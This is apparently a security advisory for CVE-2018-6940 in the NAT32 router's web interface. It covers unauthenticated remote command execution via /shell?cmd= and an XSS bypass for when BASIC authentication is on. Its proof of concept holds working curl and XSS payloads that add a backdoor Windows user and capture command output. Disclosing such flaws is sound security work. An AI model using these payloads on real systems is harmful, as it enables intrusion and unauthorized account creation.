
 
Vendor:
=============
www.nat32.com
 
 
Product:
=================
NAT32 Build (22284)
 
 
NAT32 is a versatile IP Router implemented as a WIN32 application.
 
 
Vulnerability Type:
===================
Remote Command Execution 
 
 
CVE Reference:
==============
CVE-2018-6940
 
 
Security Issue:
================
NAT32 listens on Port 8080 for its Web interface.
 
C:\>netstat -ano | findstr 8080
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       3720
 
 
If the &#039;Password Checking&#039; (BASIC authentication) feature is NOT enabled (user must select it under config tab) then remote attackers who can reach
NAT32 can potentially execute arbitrary commands, if authentication is enabled they will get &#039;Unauthorized&#039; server reply, however, read on ...
 
e.g.
 
Add user account.
 
C:\>curl "http://x.x.x.x:8080/shell?cmd=run+net+user+D1rty0Tis+abc123+/add"
<!DOCTYPE html>
<html>
 
 
If NAT32 &#039;Password Checking&#039; feature IS enabled, remote attackers can STILL potentially issue arbitrary commands exploiting a
Cross Site Scripting vulnerability in the HTTPD code of NAT32, if authenticated NAT32 users click a malicious link
or visit an attacker controlled webpage. 
 
Also worth mentioning, NAT32 implements BASIC authentication which pass BASE64 Encoded credentials which can be easily
revealed if sniffed on network.
 
When &#039;Password Checking&#039; is enabled attackers using Ajax calls via XSS would need to use a combination of &#039;%0D%0A&#039; and double encoding
to deal with &#039;white-space&#039; in order for the payload to stay intact.
 
%25 for &#039;%&#039; sign then 20 (%2520) = %20, using %20 or %2B will not cut it, however &#039;%0D%0A&#039; (CRLF) and &#039;%2520&#039; encoding serves us well.
 
NAT32 has an interesting Command &#039;EXECR&#039; that can allow attackers to capture Command output response from the server to see right away if an
attack was success or not.
 
e.g.
 
Add account and get response (EXECR)
 
HTTP Response:
<!DOCTYPE html>
<html>
 
execr net user D1rty0Tis abc123 /add Done
 
 
The NAT32 &#039;winroute&#039; Command will return host route information.
 
XSS response
 
e.g.
 
<!DOCTYPE html>
<html>
0.0.0.0         0.0.0.0         192.168.1.2        10       b    4     3 21:41 [min:sec]
127.0.0.0       255.0.0.0       127.0.0.1          306      1    3     3 22:04 [min:sec]
127.0.0.1       255.255.255.255 127.0.0.1          306      1    3     3 22:04 [min:sec]
127.255.255.255 255.255.255.255 127.0.0.1          306      1    3     3 22:04 [min:sec]
 
 
Exploit/POC:
=============
NET32 Password Checking not enabled...
 
C:\>curl "http://x.x.x.x:8080/shell?cmd=run+net+user+D1rty0Tis+abc123+/add"
 
 
NAT32 BASIC authentication enabled use XSS...
 
Add backdoor account and capture CMD output using NAT32 &#039;execr&#039; shell command.
http://x.x.x.x:8080/shell?cmd=<script>var%0D%0Axhr=new%0D%0AXMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.status==200){alert(xhr.responseText);}};xhr.open(&#039;GET&#039;,&#039;http://x.x.x.x:8080/shell?cmd=execr%2520net%2520user%2520D1rty0Tis%2520abc123%2520/add&#039;,true);xhr.send(null);</script>
 
Get Windows Routes (info disclosure):
http://x.x.x.x:8080/shell?cmd=%3Cscript%3Evar%0D%0Axhr=new%0D%0AXMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.status==200){alert(xhr.responseText);}};xhr.open(%27GET%27,%27http://x.x.x.x:8080/shell?cmd=winroute%27,true);xhr.send(null);%3C/script%3E

